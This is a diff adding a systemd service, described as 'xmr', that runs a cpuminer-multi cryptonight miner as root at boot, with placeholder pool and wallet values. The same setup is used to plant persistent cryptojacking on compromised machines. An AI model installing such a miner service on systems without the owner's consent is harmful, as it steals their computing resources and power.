@@ -1,0 +1,8 @@
+[Unit]
+Description=xmr
+After=network.target
+[Service]
+ExecStart=/root/cpuminer-multi/minerd -a cryptonight -o POOL_ADDRESS -u WALLET_ADDRESS -p x
+User=root
+[Install]
+WantedBy=multi-user.target
